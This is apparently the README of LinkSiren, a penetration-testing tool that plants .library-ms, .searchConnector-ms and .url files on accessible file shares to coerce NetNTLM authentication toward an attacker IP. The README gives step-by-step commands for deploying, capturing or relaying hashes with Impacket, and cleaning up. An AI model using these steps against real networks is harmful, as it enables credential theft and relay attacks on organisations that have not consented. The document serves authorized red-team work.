# LinkSiren

## What is this tool?
_The Siren waits thee, singing song for song._ - Walter Savage Landor

LinkSiren distributes .library-ms, .searchConnector-ms, and .url files to accessible file shares to coerce NetNTLM authentication over SMB or HTTP from hosts that open them. It's like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but it identifies the best place to put the files for coercion and has scalable deployment and cleanup built in.

## How do I use this NOW?
```bash
git clone https://github.com/gjhami/LinkSiren.git && cd LinkSiren
python -m pip install -r requirements.txt
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets <shares file> --identify
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP> --deploy
# Capture hashes
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt --cleanup
```

## How do I use this the \~right\~ way?
```bash
# Get the project
git clone https://github.com/gjhami/LinkSiren.git
cd LinkSiren

# Set up a virtual environment and install requirements
python -m venv .venv
source ./.venv/bin/activate # Linux
# .\.venv\Scripts\activate # Windows
python -m pip install -r requirements.txt

# 1. Create a targets file containing accessible shares, one per line, in the following format: \\server.domain.tld\share
#    I recommend crackmapexec or shareenum 
# 2. Use LinkSiren to identify the most active folders on them
#    Note: You may fine tune the --max-depth, --active-threshold, --fast, and --max-folders-per-share params as necessary
#    Note: Specify '.' as the domain to log in using a local user account
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets <shares file> --identify
# 3. Use LinkSiren to deploy payloads to all of the active folders
#    --identify saves UNC paths to active folders in folder_targets.txt
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP> --deploy
# 4. Let the hashes come to you and relay them as you see fit :)
#    Use CrackMapExec and LdapRelayScan for relay target identification
#    Use Impacket's ntlmrelayx for relay or smbserver + pcredz for capture on the attacker machine
#    Ex. impacket-smbserver . . -smb2support
# 5. Cleanup the payload files when you're finished gathering.
#    Set targets to a file containing UNC paths of all folders where payloads were written
#    --deploy saves UNC paths to deployed payloads in payload_folders.txt
#    Note: If you set a custom payload name (--payload) when deploying, you must set the same name here
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt --cleanup
```

## How is this better than the other tools?
Other tools are built to place a single malicious .searchConnector-ms, .library-ms, or .url file at a specified location and clean up that one malicious file. If you find yourself with access to a lot of shares you may want things to scale and you may not be in the mood to write a wrapper. LinkSiren crawls shares you currently have access to and ranks every subfolder based on the liklihood it will be opened by a user sometime soon. Then it uses this information to target malicious file distribution to multiple locations at once. Additionally, LinkSiren records the full UNC path of malicious file it creates, allowing for cleanup with a single command.

Summary
- Scales to an arbitrary number of malicious .searchConnector-ms, .library-ms, or .url files
- Targeted malicious file placement
- Single command deployment and cleanup
- Cross platform with python
  
## How will you make it even better?
I'm looking to add the following features:
- [x] Start the WebClient service on targets using searchConnector-ms and library-ms files (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#start-the-webclient-service) and [Farmer Source Code](https://github.com/mdsecactivebreach/Farmer/blob/main/crop/Crop/Crop.cs))
- [x] Coerce HTTP authentication with WebDAV connection strings (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse))
- [x] ~~Support additional file types: SCF and LNK (per [MITRE](https://attack.mitre.org/techniques/T1187/)).~~ .searchConnector-ms and .library-ms files pursued instead for their ability to start the WebClient service as part of HTTP authentication coercion.
- [ ] Multithreading/Multiprocessing for faster share crawling
- [ ] Add a progress bar for share crawling
- [ ] Enable authentication using a NTLM hash
- [ ] Enable ticket based authnentication (Kerberos)

## Note
This tools is designed for ethical hacking and penetration testing. It should be used exclusively on networks where explicit, written permission has been granted for testing. I accept no responsibility for the safety or effectiveness of this tool. Please don't sue me.
